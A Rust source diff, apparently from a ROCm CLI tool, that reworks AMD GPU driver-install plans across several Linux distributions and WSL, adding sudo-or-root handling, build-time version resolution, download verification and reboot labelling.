+                "test -e /dev/dxg || { echo 'error: /dev/dxg is missing; WSL GPU plumbing is not available' >&2; exit 1; }",
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                "test -e /usr/lib/wsl/lib/libdxcore.so || { echo 'error: /usr/lib/wsl/lib/libdxcore.so is missing' >&2; exit 1; }",
+            ),
+            // Say why up front rather than letting the first privileged step die
+            // with `sudo: command not found`, which reads like a broken plan.
+            // Skipped when already root: the plan emits no `sudo` at all then,
+            // so demanding the binary would state a precondition it is not
+            // relying on.
+            driver_command(
+                DriverCommandPhase::Prepare,
+                if escalation.needs_sudo_binary() {
+                    "command -v sudo >/dev/null 2>&1 || { echo 'error: sudo is required to install ROCDXG under /opt/rocm' >&2; exit 1; }"
+                } else {
+                    "test \"$(id -u)\" -eq 0 || { echo 'error: this plan was built to run as root' >&2; exit 1; }"
+                },
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}apt-get update"),
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}apt-get install -y ca-certificates curl"),
+            ),
+            driver_command(
+                DriverCommandPhase::Execute,
+                &format!("curl -L --fail --show-error --output '{deb_path}' '{url}'"),
+            ),
+            // Authenticating the download is the whole trust anchor for this
+            // plan: everything after it runs the package's maintainer scripts
+            // as root. `sha256sum -c -` exits non-zero on a mismatch, which
+            // aborts the plan before the install step.
+            verify_download,
+            driver_command(
+                DriverCommandPhase::Execute,
+                &format!("{sudo}apt-get install -y '{deb_path}'"),
+            ),
+            driver_command(DriverCommandPhase::Execute, &format!("{sudo}ldconfig")),
+            driver_command(
+                DriverCommandPhase::Verify,
+                "test -e /opt/rocm/lib/librocdxg.so",
+            ),
+            driver_command(
+                DriverCommandPhase::Verify,
+                "ldconfig -p | grep -q 'librocdxg\\.so'",
+            ),
+        ],
+        // `rocm diagnose` carries the WSL catalog, including the host-side
+        // form that inspects a distro over `wsl.exe` without needing anything
+        // installed inside it.
+        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
+        // Userspace only: `ldconfig` publishes the library in this boot.
+        reboot_required: false,
+    }
+}
+
 fn build_driver_install_plan(
     examine: &ExamineSummary,
     os_release_text: &str,
     dkms: bool,
+    escalation: PrivilegeEscalation,
 ) -> DriverInstallPlan {
-    let repo_version_expr = "${ROCM_CLI_AMDGPU_VERSION:-7.2.4}".to_owned();
+    // Resolve the AMD graphics version and amdgpu-install package release once,
+    // here at plan-build time, so the concrete values are baked into both the
+    // human-readable summary and every command the plan runs. Keeping shell
+    // `${VAR:-default}` templates in the commands used to be load-bearing, but
+    // AMD's apt `sources.list` line embeds the template inside POSIX single
+    // quotes, which suppress all expansion — so the literal `${...}` would land
+    // in the repo file. Resolving up front fixes that and keeps the summary and
+    // the executed commands in agreement.
+    let repo_version = resolve_shell_default_template("${ROCM_CLI_AMDGPU_VERSION:-7.2.4}");
+    let package_release =
+        resolve_shell_default_template("${ROCM_CLI_AMDGPU_PACKAGE_RELEASE:-70204}");
     if examine.os == "windows" {
         return DriverInstallPlan {
             supported: false,
@@ -2870,27 +3855,16 @@ fn build_driver_install_plan(
             os_id: "windows".to_owned(),
             version_id: String::new(),
             codename: String::new(),
-            repo_version_expr,
+            repo_version,
             reason: "Windows driver install is validate-only in rocm-cli; use `rocm examine` to inspect the AMD display driver.".to_owned(),
             preflight_checks: Vec::new(),
             commands: Vec::new(),
             checks: vec!["rocm examine".to_owned()],
+            reboot_required: true,
         };
     }
     if examine.wsl.as_ref().is_some_and(|wsl| wsl.is_wsl) {
-        return DriverInstallPlan {
-            supported: false,
-            mutating: false,
-            policy: "wsl_rocdxg".to_owned(),
-            os_id: "wsl".to_owned(),
-            version_id: String::new(),
-            codename: String::new(),
-            repo_version_expr,
-            reason: "WSL uses the Windows host driver plus ROCDXG; run `scripts/wsl_setup_rocdxg.sh` inside WSL instead of installing Linux DKMS.".to_owned(),
-            preflight_checks: Vec::new(),
-            commands: Vec::new(),
-            checks: vec!["rocm examine".to_owned(), "scripts/wsl_preflight.py".to_owned()],
-        };
+        return wsl_rocdxg_driver_plan(escalation);
     }
 
     let os_id = parse_os_release_field(os_release_text, "ID").unwrap_or_default();
@@ -2906,9 +3880,10 @@ fn build_driver_install_plan(
             os_id,
             version_id,
             codename,
-            repo_version_expr,
+            repo_version,
             dkms,
             true,
+            escalation,
         ),
         ("debian", "12" | "13") => {
             let repo_codename = if version_id == "13" { "noble" } else { "jammy" };
@@ -2916,9 +3891,10 @@ fn build_driver_install_plan(
                 os_id,
                 version_id,
                 repo_codename.to_owned(),
-                repo_version_expr,
+                repo_version,
                 dkms,
                 false,
+                escalation,
             );
             // Debian deliberately reuses AMD's Ubuntu-suite repository: AMD's
             // documented Debian install maps Debian 12 -> jammy and 13 -> noble
@@ -2935,36 +3911,52 @@ fn build_driver_install_plan(
             os_id,
             version_id,
             codename,
-            repo_version_expr,
+            repo_version,
+            package_release,
             dkms,
             DnfDriverDistro::Rhel,
+            escalation,
         ),
         ("ol", "10.1" | "9.7" | "8.10") => dnf_driver_plan(
             os_id,
             version_id,
             codename,
-            repo_version_expr,
+            repo_version,
+            package_release,
             dkms,
             DnfDriverDistro::Oracle,
+            escalation,
         ),
         ("rocky", "9.4" | "9.6" | "9.7") => dnf_driver_plan(
             os_id,
             version_id,
             codename,
-            repo_version_expr,
+            repo_version,
+            package_release,
             dkms,
             DnfDriverDistro::Rocky,
+            escalation,
         ),
         ("sles" | "sle", "15.7") => {
-            sles_driver_plan(os_id, version_id, codename, repo_version_expr, dkms)
+            sles_driver_plan(
+                os_id,
+                version_id,
+                codename,
+                repo_version,
+                package_release,
+                dkms,
+                escalation,
+            )
         }
         _ => driver_plan_via_id_like(
             &os_id,
             &version_id,
             &id_like,
             &codename,
-            &repo_version_expr,
+            &repo_version,
+            &package_release,
             dkms,
+            escalation,
         )
         .unwrap_or_else(|| DriverInstallPlan {
             supported: false,
@@ -2973,11 +3965,13 @@ fn build_driver_install_plan(
             os_id,
             version_id,
             codename,
-            repo_version_expr,
+            repo_version,
             reason: "Linux DKMS driver install is currently planned only for AMD-documented Ubuntu, Debian, RHEL, Oracle Linux, SLES, and Rocky versions; no commands were guessed for this distro.".to_owned(),
             preflight_checks: Vec::new(),
             commands: Vec::new(),
             checks: vec!["rocm examine".to_owned()],
+            // Kernel module: not live until the machine comes back up.
+            reboot_required: true,
         }),
     }
 }
@@ -2991,13 +3985,18 @@ fn build_driver_install_plan(
 /// version of the base family, so version-misaligned derivatives still fall
 /// through to the unsupported plan rather than fabricating a repository URL that
 /// would 404.
+// Every parameter is one already-resolved fact the plan is templated from;
+// bundling them into a struct would only move the same list one level out.
+#[allow(clippy::too_many_arguments)]
 fn driver_plan_via_id_like(
     os_id: &str,
     version_id: &str,
     id_like: &str,
     codename: &str,
-    repo_version_expr: &str,
+    repo_version: &str,
+    package_release: &str,
     dkms: bool,
+    escalation: PrivilegeEscalation,
 ) -> Option<DriverInstallPlan> {
     let likes: Vec<String> = id_like
         .split_whitespace()
@@ -3022,9 +4021,10 @@ fn driver_plan_via_id_like(
             os_id.to_owned(),
             version_id.to_owned(),
             codename,
-            repo_version_expr.to_owned(),
+            repo_version.to_owned(),
             dkms,
             true,
+            escalation,
         ));
     }
 
@@ -3036,9 +4036,10 @@ fn driver_plan_via_id_like(
             os_id.to_owned(),
             version_id.to_owned(),
             repo_codename.to_owned(),
-            repo_version_expr.to_owned(),
+            repo_version.to_owned(),
             dkms,
             false,
+            escalation,
         ));
     }
 
@@ -3056,9 +4057,11 @@ fn driver_plan_via_id_like(
             os_id.to_owned(),
             version_id.to_owned(),
             codename.to_owned(),
-            repo_version_expr.to_owned(),
+            repo_version.to_owned(),
+            package_release.to_owned(),
             dkms,
             DnfDriverDistro::Generic,
+            escalation,
         ));
     }
 
@@ -3090,49 +4093,62 @@ fn apt_driver_plan(
     os_id: String,
     version_id: String,
     codename: String,
-    repo_version_expr: String,
+    repo_version: String,
     dkms: bool,
     include_linux_modules_extra: bool,
+    escalation: PrivilegeEscalation,
 ) -> DriverInstallPlan {
+    // Empty when already root, so no command depends on a `sudo` binary that a
+    // container or minimal image very likely does not have.
+    let sudo = escalation.prefix();
     let mut commands = Vec::new();
     if dkms {
         commands.extend([
-            driver_command(DriverCommandPhase::Prepare, "sudo apt-get update"),
             driver_command(
                 DriverCommandPhase::Prepare,
-                "sudo apt-get install -y ca-certificates curl gnupg",
+                &format!("{sudo}apt-get update"),
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}apt-get install -y ca-certificates curl gnupg"),
             ),
         ]);
         let header_command = if include_linux_modules_extra {
-            "sudo apt-get install -y \"linux-headers-$(uname -r)\" \"linux-modules-extra-$(uname -r)\""
+            format!(
+                "{sudo}apt-get install -y \"linux-headers-$(uname -r)\" \"linux-modules-extra-$(uname -r)\""
+            )
         } else {
-            "sudo apt-get install -y \"linux-headers-$(uname -r)\""
+            format!("{sudo}apt-get install -y \"linux-headers-$(uname -r)\"")
         };
-        commands.push(driver_command(DriverCommandPhase::Prepare, header_command));
+        commands.push(driver_command(DriverCommandPhase::Prepare, &header_command));
         commands.extend([
             driver_command(
                 DriverCommandPhase::Prepare,
-                "sudo install -m 0755 -d /etc/apt/keyrings",
-            ),
-            driver_command(
-                DriverCommandPhase::Prepare,
-                "curl -fsSL https://repo.radeon.com/rocm/rocm.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/rocm.gpg",
+                &format!("{sudo}install -m 0755 -d /etc/apt/keyrings"),
             ),
             driver_command(
                 DriverCommandPhase::Prepare,
                 &format!(
-                    "printf '%s\\n' 'deb [arch=amd64 signed-by=/etc/apt/keyrings/rocm.gpg] https://repo.radeon.com/graphics/{repo_version_expr}/ubuntu {codename} main' | sudo tee /etc/apt/sources.list.d/amdgpu.list >/dev/null"
+                    "curl -fsSL https://repo.radeon.com/rocm/rocm.gpg.key | {sudo}gpg --dearmor -o /etc/apt/keyrings/rocm.gpg"
                 ),
             ),
             driver_command(
                 DriverCommandPhase::Prepare,
-                "printf '%s\\n' 'Package: *' 'Pin: release o=repo.radeon.com' 'Pin-Priority: 600' | sudo tee /etc/apt/preferences.d/rocm-pin-600 >/dev/null",
+                &format!(
+                    "printf '%s\\n' 'deb [arch=amd64 signed-by=/etc/apt/keyrings/rocm.gpg] https://repo.radeon.com/graphics/{repo_version}/ubuntu {codename} main' | {sudo}tee /etc/apt/sources.list.d/amdgpu.list >/dev/null"
+                ),
             ),
-            driver_command(DriverCommandPhase::Prepare, "sudo apt-get update"),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!(
+                    "printf '%s\\n' 'Package: *' 'Pin: release o=repo.radeon.com' 'Pin-Priority: 600' | {sudo}tee /etc/apt/preferences.d/rocm-pin-600 >/dev/null"
+                ),
+            ),
+            driver_command(DriverCommandPhase::Prepare, &format!("{sudo}apt-get update")),
         ]);
         commands.push(driver_command(
             DriverCommandPhase::Execute,
-            "sudo apt-get install -y amdgpu-dkms",
+            &format!("{sudo}apt-get install -y amdgpu-dkms"),
         ));
         commands.extend([
             driver_command(DriverCommandPhase::Verify, "dkms status amdgpu"),
@@ -3151,7 +4167,7 @@ fn apt_driver_plan(
         os_id,
         version_id,
         codename,
-        repo_version_expr,
+        repo_version,
         reason: if dkms {
             "Plan uses AMD's package-manager DKMS flow and requires explicit approval before execution."
         } else {
@@ -3159,11 +4175,9 @@ fn apt_driver_plan(
         }
         .to_owned(),
         preflight_checks: if dkms {
-            vec![
-                "root access: run as root, or ensure `sudo -v` succeeds before approval".to_owned(),
-                "`sudo` command is available when not running as root".to_owned(),
-                "`apt-get` package manager is available".to_owned(),
-            ]
+            let mut checks = driver_root_preflight_checks(escalation);
+            checks.push("`apt-get` package manager is available".to_owned());
+            checks
         } else {
             Vec::new()
         },
@@ -3176,54 +4190,66 @@ fn apt_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
+// Same shape as the other distro plan builders: a flat list of resolved facts
+// the command templates read, one of which is now the escalation prefix.
+#[allow(clippy::too_many_arguments)]
 fn dnf_driver_plan(
     os_id: String,
     version_id: String,
     codename: String,
-    repo_version_expr: String,
+    repo_version: String,
+    package_release: String,
     dkms: bool,
     distro: DnfDriverDistro,
+    escalation: PrivilegeEscalation,
 ) -> DriverInstallPlan {
+    // Empty when already root, so no command depends on a `sudo` binary that a
+    // container or minimal image very likely does not have.
+    let sudo = escalation.prefix();
     let mut commands = Vec::new();
     if dkms {
         match distro {
             DnfDriverDistro::Rhel | DnfDriverDistro::Generic => {
                 commands.extend(
-                    rhel_kernel_prepare_commands(&version_id)
+                    rhel_kernel_prepare_commands(&version_id, escalation)
                         .into_iter()
-                        .map(|command| driver_command(DriverCommandPhase::Prepare, command)),
+                        .map(|command| driver_command(DriverCommandPhase::Prepare, &command)),
                 );
             }
             DnfDriverDistro::Oracle => {
                 commands.push(driver_command(
                     DriverCommandPhase::Prepare,
-                    "sudo dnf install -y \"kernel-uek-devel-$(uname -r)\"",
+                    &format!("{sudo}dnf install -y \"kernel-uek-devel-$(uname -r)\""),
                 ));
             }
             DnfDriverDistro::Rocky => {
                 commands.push(driver_command(
                     DriverCommandPhase::Prepare,
-                    "sudo dnf install -y kernel-headers kernel-devel kernel-devel-matched",
+                    &format!(
+                        "{sudo}dnf install -y kernel-headers kernel-devel kernel-devel-matched"
+                    ),
                 ));
             }
         }
         commands.push(driver_command(
             DriverCommandPhase::Prepare,
             &format!(
-                "sudo dnf install -y {}",
-                amdgpu_install_rpm_url(&repo_version_expr, &version_id, distro)
+                "{sudo}dnf install -y {}",
+                amdgpu_install_rpm_url(&repo_version, &package_release, &version_id, distro)
             ),
         ));
         commands.push(driver_command(
             DriverCommandPhase::Prepare,
-            "sudo dnf clean all",
+            &format!("{sudo}dnf clean all"),
         ));
         commands.push(driver_command(
             DriverCommandPhase::Execute,
-            "sudo dnf install -y amdgpu-dkms",
+            &format!("{sudo}dnf install -y amdgpu-dkms"),
         ));
         commands.extend([
             driver_command(DriverCommandPhase::Verify, "dkms status amdgpu"),
@@ -3242,7 +4268,7 @@ fn dnf_driver_plan(
         os_id,
         version_id,
         codename,
-        repo_version_expr,
+        repo_version,
         reason: if dkms {
             "Plan uses AMD's documented DNF DKMS flow and requires explicit approval before execution."
         } else {
@@ -3250,14 +4276,13 @@ fn dnf_driver_plan(
         }
         .to_owned(),
         preflight_checks: if dkms {
-            vec![
-                "root access: run as root, or ensure `sudo -v` succeeds before approval"
-                    .to_owned(),
-                "`sudo` command is available when not running as root".to_owned(),
-                "`dnf` package manager is available".to_owned(),
+            let mut checks = driver_root_preflight_checks(escalation);
+            checks.push("`dnf` package manager is available".to_owned());
+            checks.push(
                 "enterprise Linux repositories are registered and current before approval"
                     .to_owned(),
-            ]
+            );
+            checks
         } else {
             Vec::new()
         },
@@ -3270,6 +4295,8 @@ fn dnf_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -3277,40 +4304,53 @@ fn sles_driver_plan(
     os_id: String,
     version_id: String,
     codename: String,
-    repo_version_expr: String,
+    repo_version: String,
+    package_release: String,
     dkms: bool,
+    escalation: PrivilegeEscalation,
 ) -> DriverInstallPlan {
+    // Empty when already root, so no command depends on a `sudo` binary that a
+    // container or minimal image very likely does not have.
+    let sudo = escalation.prefix();
     let mut commands = Vec::new();
     if dkms {
         commands.extend([
             driver_command(
                 DriverCommandPhase::Prepare,
-                &format!("sudo SUSEConnect -p sle-module-desktop-applications/{version_id}/x86_64"),
+                &format!(
+                    "{sudo}SUSEConnect -p sle-module-desktop-applications/{version_id}/x86_64"
+                ),
             ),
             driver_command(
                 DriverCommandPhase::Prepare,
-                &format!("sudo SUSEConnect -p sle-module-development-tools/{version_id}/x86_64"),
+                &format!("{sudo}SUSEConnect -p sle-module-development-tools/{version_id}/x86_64"),
             ),
             driver_command(
                 DriverCommandPhase::Prepare,
-                &format!("sudo SUSEConnect -p PackageHub/{version_id}/x86_64"),
+                &format!("{sudo}SUSEConnect -p PackageHub/{version_id}/x86_64"),
             ),
-            driver_command(DriverCommandPhase::Prepare, "sudo zypper refresh"),
             driver_command(
                 DriverCommandPhase::Prepare,
-                "sudo zypper install -y kernel-default-devel",
+                &format!("{sudo}zypper refresh"),
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}zypper install -y kernel-default-devel"),
             ),
             driver_command(
                 DriverCommandPhase::Prepare,
                 &format!(
-                    "sudo zypper --no-gpg-checks install -y {}",
-                    amdgpu_install_sles_rpm_url(&repo_version_expr, &version_id)
+                    "{sudo}zypper --no-gpg-checks install -y {}",
+                    amdgpu_install_sles_rpm_url(&repo_version, &package_release, &version_id)
                 ),
             ),
-            driver_command(DriverCommandPhase::Prepare, "sudo zypper refresh"),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}zypper refresh"),
+            ),
             driver_command(
                 DriverCommandPhase::Execute,
-                "sudo zypper install -y amdgpu-dkms",
+                &format!("{sudo}zypper install -y amdgpu-dkms"),
             ),
             driver_command(DriverCommandPhase::Verify, "dkms status amdgpu"),
             driver_command(DriverCommandPhase::Verify, "test -e /dev/kfd"),
@@ -3328,7 +4368,7 @@ fn sles_driver_plan(
         os_id,
         version_id,
         codename,
-        repo_version_expr,
+        repo_version,
         reason: if dkms {
             "Plan uses AMD's documented SLES DKMS flow and requires explicit approval before execution."
         } else {
@@ -3336,13 +4376,12 @@ fn sles_driver_plan(
         }
         .to_owned(),
         preflight_checks: if dkms {
-            vec![
-                "root access: run as root, or ensure `sudo -v` succeeds before approval"
-                    .to_owned(),
-                "`sudo` command is available when not running as root".to_owned(),
-                "`zypper` package manager is available".to_owned(),
+            let mut checks = driver_root_preflight_checks(escalation);
+            checks.push("`zypper` package manager is available".to_owned());
+            checks.push(
                 "`SUSEConnect` is available and the host is registered before approval".to_owned(),
-            ]
+            );
+            checks
         } else {
             Vec::new()
         },
@@ -3355,26 +4394,30 @@ fn sles_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
-fn rhel_kernel_prepare_commands(version_id: &str) -> Vec<&'static str> {
+fn rhel_kernel_prepare_commands(version_id: &str, escalation: PrivilegeEscalation) -> Vec<String> {
+    let sudo = escalation.prefix();
     if version_id.starts_with("8.") {
         vec![
-            "sudo dnf install -y \"kernel-headers-$(uname -r)\"",
-            "sudo dnf install -y \"kernel-devel-$(uname -r)\"",
+            format!("{sudo}dnf install -y \"kernel-headers-$(uname -r)\""),
+            format!("{sudo}dnf install -y \"kernel-devel-$(uname -r)\""),
         ]
     } else {
         vec![
-            "sudo dnf install -y \"kernel-headers-$(uname -r)\"",
-            "sudo dnf install -y \"kernel-devel-$(uname -r)\"",
-            "sudo dnf install -y \"kernel-devel-matched-$(uname -r)\"",
+            format!("{sudo}dnf install -y \"kernel-headers-$(uname -r)\""),
+            format!("{sudo}dnf install -y \"kernel-devel-$(uname -r)\""),
+            format!("{sudo}dnf install -y \"kernel-devel-matched-$(uname -r)\""),
         ]
     }
 }
 
 fn amdgpu_install_rpm_url(
-    repo_version_expr: &str,
+    repo_version: &str,
+    package_release: &str,
     version_id: &str,
     distro: DnfDriverDistro,
 ) -> String {
@@ -3382,16 +4425,20 @@ fn amdgpu_install_rpm_url(
         DnfDriverDistro::Rhel => "rhel",
         DnfDriverDistro::Oracle | DnfDriverDistro::Rocky | DnfDriverDistro::Generic => "el",
     };
-    let repo_version = dnf_repo_version_path(version_id);
+    let repo_version_path = dnf_repo_version_path(version_id);
     let el_major = linux_major_version(version_id);
     format!(
-        "https://repo.radeon.com/amdgpu-install/{repo_version_expr}/{repo_family}/{repo_version}/amdgpu-install-{repo_version_expr}.${{ROCM_CLI_AMDGPU_PACKAGE_RELEASE:-70204}}-1.el{el_major}.noarch.rpm"
+        "https://repo.radeon.com/amdgpu-install/{repo_version}/{repo_family}/{repo_version_path}/amdgpu-install-{repo_version}.{package_release}-1.el{el_major}.noarch.rpm"
     )
 }
 
-fn amdgpu_install_sles_rpm_url(repo_version_expr: &str, version_id: &str) -> String {
+fn amdgpu_install_sles_rpm_url(
+    repo_version: &str,
+    package_release: &str,
+    version_id: &str,
+) -> String {
     format!(
-        "https://repo.radeon.com/amdgpu-install/{repo_version_expr}/sle/{version_id}/amdgpu-install-{repo_version_expr}.${{ROCM_CLI_AMDGPU_PACKAGE_RELEASE:-70204}}-1.noarch.rpm"
+        "https://repo.radeon.com/amdgpu-install/{repo_version}/sle/{version_id}/amdgpu-install-{repo_version}.{package_release}-1.noarch.rpm"
     )
 }
 
@@ -3411,11 +4458,59 @@ fn linux_major_version(version_id: &str) -> &str {
     version_id.split('.').next().unwrap_or(version_id)
 }
 
+/// Preconditions about reaching root for a driver plan.
+///
+/// These differ by escalation: a plan that will prefix `sudo` additionally
+/// depends on a `sudo` binary being installed, while a plan built as root does
+/// not. Listing that precondition when already root would state a requirement
+/// the plan is not relying on — which is exactly the contradiction that made
+/// the unconditional prefix confusing to debug.
+fn driver_root_preflight_checks(escalation: PrivilegeEscalation) -> Vec<String> {
+    let mut checks =
+        vec!["root access: run as root, or ensure `sudo -v` succeeds before approval".to_owned()];
+    if escalation.needs_sudo_binary() {
+        checks.push("`sudo` command is available when not running as root".to_owned());
+    }
+    checks
+}
+
 fn driver_command(phase: DriverCommandPhase, command: &str) -> DriverPlanCommand {
     DriverPlanCommand {
         phase,
         command: command.to_owned(),
     }
+}
+
+/// Resolve a `${VAR:-default}` shell parameter-expansion template to its
+/// effective value: the value of `VAR` when it is set and non-empty (matching
+/// the shell `:-` semantics), otherwise the literal default. This is resolved
+/// once at plan-build time so the concrete value is baked into both the
+/// human-readable summary and the commands the plan runs, rather than leaking an
+/// unexpanded `${...}` placeholder into user-facing output or depending on the
+/// runtime shell — which, for the single-quoted apt `sources.list` line, would
+/// never expand it at all.
+///
+/// Only a single, flat `${VAR:-default}` template is recognized. Anything else —
+/// a bare `${VAR}`, a `${VAR:=x}`/`${VAR-x}` form, or a nested default such as
+/// `${A:-${B:-x}}` whose default itself contains `${` — is returned unchanged, so
+/// an unresolvable shape degrades to its literal input rather than to a
+/// half-resolved string.
+fn resolve_shell_default_template(expr: &str) -> String {
+    let Some(inner) = expr.strip_prefix("${").and_then(|s| s.strip_suffix('}')) else {
+        return expr.to_owned();
+    };
+    let Some((var, default)) = inner.split_once(":-") else {
+        return expr.to_owned();
+    };
+    if default.contains("${") {
+        // Nested or embedded templates are beyond this flat matcher; return the
+        // input untouched rather than emitting a partially resolved string.
+        return expr.to_owned();
+    }
+    std::env::var(var)
+        .ok()
+        .filter(|value| !value.is_empty())
+        .unwrap_or_else(|| default.to_owned())
 }
 
 fn render_driver_install_plan(plan: &DriverInstallPlan, yes: bool, dry_run: bool) -> String {
@@ -3437,7 +4532,7 @@ fn render_driver_install_plan(plan: &DriverInstallPlan, yes: bool, dry_run: bool
         empty_as_unknown(&plan.version_id)
     );
     let _ = writeln!(output, "  codename: {}", empty_as_unknown(&plan.codename));
-    let _ = writeln!(output, "  repo_version: {}", plan.repo_version_expr);
+    let _ = writeln!(output, "  repo_version: {}", plan.repo_version);
     let _ = writeln!(output, "  reason: {}", plan.reason);
     if !plan.preflight_checks.is_empty() {
         let _ = writeln!(output, "  preflight_checks:");
@@ -3468,14 +4563,23 @@ fn render_driver_install_plan(plan: &DriverInstallPlan, yes: bool, dry_run: bool
         .iter()
         .filter(|command| command.phase == DriverCommandPhase::Verify)
         .collect::<Vec<_>>();
+    // A plan that changes nothing kernel-side is live as soon as it finishes, so
+    // labelling its checks "post_reboot" would tell the user to reboot for
+    // nothing — and would contradict the `reboot_required: false` this same plan
+    // reports after executing.
+    let checks_label = if plan.reboot_required {
+        "post_reboot"
+    } else {
+        "post_install"
+    };
     if !verification_commands.is_empty() {
-        let _ = writeln!(output, "  post_reboot_check_commands:");
+        let _ = writeln!(output, "  {checks_label}_check_commands:");
         for command in verification_commands {
             let _ = writeln!(output, "    {}", command.command);
         }
     }
     if !plan.checks.is_empty() {
-        let _ = writeln!(output, "  post_reboot_checks:");
+        let _ = writeln!(output, "  {checks_label}_checks:");
         for check in &plan.checks {
             let _ = writeln!(output, "    {check}");
         }
@@ -3667,7 +4771,7 @@ fn engines(command: EnginesCommand) -> Result<()> {
             println!("  reinstall: {reinstall}");
             println!("  env_id: {}", response.env_id);
             println!("  env_path: {}", response.env_path);
-            for warning in response.warnings {
+            for warning in &response.warnings {
                 println!("  warning: {warning}");
             }
             if response.managed_env == Some(false) {
@@ -3686,6 +4790,12 @@ fn engines(command: EnginesCommand) -> Result<()> {
                 config.save(&paths)?;
                 let _ = seeded_preference;
             }
+            // Settle last, matching `maybe_auto_install_sdk_preferred_engine`. The
+            // check blocks then print under the `engine:`/`runtime_id:`/`env_id:`
+            // lines they describe instead of above them, and the config bookkeeping
+            // above still lands when settling fails — the engine did install; it is
+            // the runtime it left behind that is being reported on.
+            settle_engine_install(&paths, &engine, &runtime_id, &response)?;
             record_cli_audit_event(
                 &paths,
                 "engine",
@@ -3809,6 +4919,51 @@ fn runtime_manifest_for_selector<'a>(
         })
 }
 
+/// The `runtime_key` of the runtime whose install root contains `python`.
+fn runtime_key_for_python(paths: &AppPaths, python: &Path) -> Option<String> {
+    let manifests = therock::load_runtime_manifests(paths).ok()?;
+    runtime_key_owning_python(&manifests, python).map(str::to_owned)
+}
+
+/// Which runtime owns an interpreter, decided by install root.
+///
+/// Split from the registry read so the decision can be tested without a
+/// registry on disk, matching `sdk_torch_build_from_manifest`.
+///
+/// `runtime_id` cannot answer this: it is shared by every side-by-side install
+/// of one channel and family, which is exactly the situation an engine install
+/// has to be attributed in. An install root contains one runtime by
+/// construction, so the interpreter's path settles it.
+///
+/// Both sides are compared verbatim *and* canonicalized. The CLI writes
+/// `install_root` canonicalized while an engine adapter reports back whatever
+/// path it was handed, and comparing a single form makes ownership fail
+/// silently on a symlinked runtimes directory. Roots can nest, so the longest
+/// containing root wins.
+fn runtime_key_owning_python<'a>(
+    manifests: &'a [therock::InstalledRuntimeManifest],
+    python: &Path,
+) -> Option<&'a str> {
+    fn both_forms(path: &Path) -> Vec<PathBuf> {
+        let verbatim = path.to_path_buf();
+        match path.canonicalize() {
+            Ok(resolved) if resolved != verbatim => vec![verbatim, resolved],
+            _ => vec![verbatim],
+        }
+    }
+
+    let pythons = both_forms(python);
+    manifests
+        .iter()
+        .filter(|manifest| {
+            both_forms(&manifest.install_root)
+                .iter()
+                .any(|root| pythons.iter().any(|python| python.starts_with(root)))
+        })
+        .max_by_key(|manifest| manifest.install_root.as_os_str().len())
+        .map(|manifest| manifest.runtime_key.as_str())
+}
+
 fn env_root_for_service(
     paths: &AppPaths,
     engine: &str,
@@ -3869,7 +5024,7 @@ fn ensure_self_managed_engine_ready(
         None
     } else {
         eprintln!("Preparing {engine} for GPU serving...");
-        Some(engine_request_with_env_root::<_, InstallResponse>(
+        let response = engine_request_with_env_root::<_, InstallResponse>(
             Some(paths),
             engine,
             EngineMethod::Install,
@@ -3880,7 +5035,14 @@ fn ensure_self_managed_engine_ready(
                 env_root: env_root.clone(),
             },
             env_root.as_deref(),
-        )?)
+        )?;
+        // No `settle_engine_install` here. This function returns at the top unless
+        // `engine_manages_own_runtime(engine)`, and that is exactly the case
+        // `settles_runtime_torch` declines: the runtime holds the engine's own
+        // binary, not an interpreter with a torch in it. Calling it would be inert
+        // at best, and a call that provably cannot act invites someone to "fix" the
+        // gate later.
+        Some(response)
     };
 
     let engine_config = config.engine_config_mut(engine);
@@ -4197,6 +5359,7 @@ fn resolve_engine_env(
         },
         env_root.as_deref(),
     )?;
+    settle_engine_install(paths, engine, &runtime_id, &response)?;
     Ok(ResolvedEngineEnv {
         env_id: response.env_id,
         runtime_id,
@@ -4405,6 +5568,146 @@ fn engine_recipe_with_tool_call_override(
     Some(hint)
 }
 
+/// Sampling defaults a `rocm serve` invocation can push into a vLLM launch.
+#[derive(Debug, Clone, Copy, Default, PartialEq)]
+struct ServeGenerationDefaults {
+    temperature: Option<f32>,
+    top_p: Option<f32>,
+    max_tokens: Option<u32>,
+}
+
+impl ServeGenerationDefaults {
+    const fn is_empty(&self) -> bool {
+        self.temperature.is_none() && self.top_p.is_none() && self.max_tokens.is_none()
+    }
+}
+
+/// Applies `rocm serve` generation defaults (`--temperature`/`--top-p`/`--max-tokens`)
+/// to the selected engine's launch recipe.
+///
+/// vLLM `serve` has no raw `--temperature`/`--top-p` flags; `--override-generation-config`
+/// is the supported way to set server-wide sampling defaults, so `--max-tokens` is
+/// mapped onto vLLM's `max_new_tokens` output cap. Only supplied values are written,
+/// and any values already carried by an authored recipe's
+/// `--override-generation-config` are preserved (the CLI-supplied keys win).
+///
+/// Lemonade's llama.cpp backend accepts the equivalent `--temperature`, `--top-p`,
+/// and `--n-predict` launch flags. A minimal hint is synthesized when none exists.
+/// With no defaults supplied the hint passes through unchanged.
+fn engine_recipe_with_generation_defaults(
+    engine: &str,
+    hint: Option<EngineRecipeHint>,
+    defaults: ServeGenerationDefaults,
+) -> Result<Option<EngineRecipeHint>> {
+    if defaults.is_empty() {
+        return Ok(hint);
+    }
+    let mut hint = hint.unwrap_or_else(|| EngineRecipeHint {
+        contract_version: ENGINE_RECIPE_CONTRACT_VERSION.to_owned(),
+        engine: engine.to_owned(),
+        ..EngineRecipeHint::default()
+    });
+    if engine.eq_ignore_ascii_case("vllm") {
